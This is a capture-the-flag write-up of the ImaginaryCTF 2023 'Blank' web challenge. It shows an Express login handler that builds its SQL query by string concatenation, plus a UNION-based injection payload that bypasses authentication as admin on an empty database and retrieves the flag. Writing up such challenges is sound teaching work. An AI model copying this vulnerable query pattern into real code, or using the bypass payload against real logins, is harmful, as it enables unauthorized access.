---
title: ImaginaryCTF 2023 - Blank
description: Writeup for Blank web challenge
date: 2023-12-18
tldr: I asked ChatGPT to make me a website. It refused to make it vulnerable so I added a little something to make it interesting. I might have forgotten something though...
draft: false
tags: ["ctf", "writeup", "web"]
---

# blank

I asked ChatGPT to make me a website. It refused to make it vulnerable so I added a little something to make it interesting. I might have forgotten something though...

Attachments
https://imaginaryctf.org/r/FVauo#blank_dist.zip http://blank.chal.imaginaryctf.org


## The main js code

```javascript
const express = require('express');
const session = require('express-session');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');
const crypto = require('crypto');
var fs = require("fs");
const path = require('path');

const app = express();
const port = 5000;

const db = new sqlite3.Database(':memory:');

db.serialize(() => {
  db.run('CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT)');
});

app.use(session({
  secret: crypto.randomBytes(16).toString('base64'),
  resave: false,
  saveUninitialized: true
}));

app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');
app.use(express.static('static'))
app.use(bodyParser.urlencoded({ extended: true }));

app.get('/', (req, res) => {
  const loggedIn = req.session.loggedIn;
  const username = req.session.username;

  res.render('index', { loggedIn, username });
});

app.get('/login', (req, res) => {
  res.render('login');
});

app.post('/login', (req, res) => {
  const username = req.body.username;
  const password = req.body.password;

  db.get('SELECT * FROM users WHERE username = "' + username + '" and password = "' + password+ '"', (err, row) => {
    if (err) {
      console.error(err);
      res.status(500).send('Error retrieving user');
    } else {
      if (row) {
        req.session.loggedIn = true;
        req.session.username = username;
        res.send('Login successful!');
      } else {
        res.status(401).send('Invalid username or password');
      }
    }
  });
});

app.get('/logout', (req, res) => {
  req.session.destroy();
  res.send('Logout successful!');
});

app.get('/flag', (req, res) => {
  if (req.session.username == "admin") {
    res.send('Welcome admin. The flag is ' + fs.readFileSync('flag.txt', 'utf8'));
  }
  else if (req.session.loggedIn) {
    res.status(401).send('You must be admin to get the flag.');
  } else {
    res.status(401).send('Unauthorized. Please login first.');
  }
});

app.listen(port, () => {
  console.log(`App listening at http://localhost:${port}`);
});

```

## flag location

looking at `Dockerfile` we see the flag is located in `/app/flag.txt`

## data for login endpoint POST

`username=admin&password=hello`

# sql injection?

The provided code is vulnerable to SQL injection due to the way it constructs the SQL query string using string concatenation with the username and password variables. An attacker can potentially manipulate the password variable to inject malicious SQL code, leading to unauthorized access and bypassing the password authentication.

## the db is blank but do we care?

However the db is completely blank there is no data in it.

However the login does not really care about the user existing in the db, it just cares about the query returning at least **some** data

```sql
CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT);

select * from users where username="admin" and password = "hovno" union select 1+1,1+1,1+1;--"
```


this allows as to login as any user including the `admin` user neede to access the /flag endpoint

we login with 

```
admin
" union select 1+1,1+1,1+1;--"
```

and proceed to get the flag at http://blank.chal.imaginaryctf.org/flag

```
Welcome admin. The flag is ictf{sqli_too_powerful_9b36140a}
```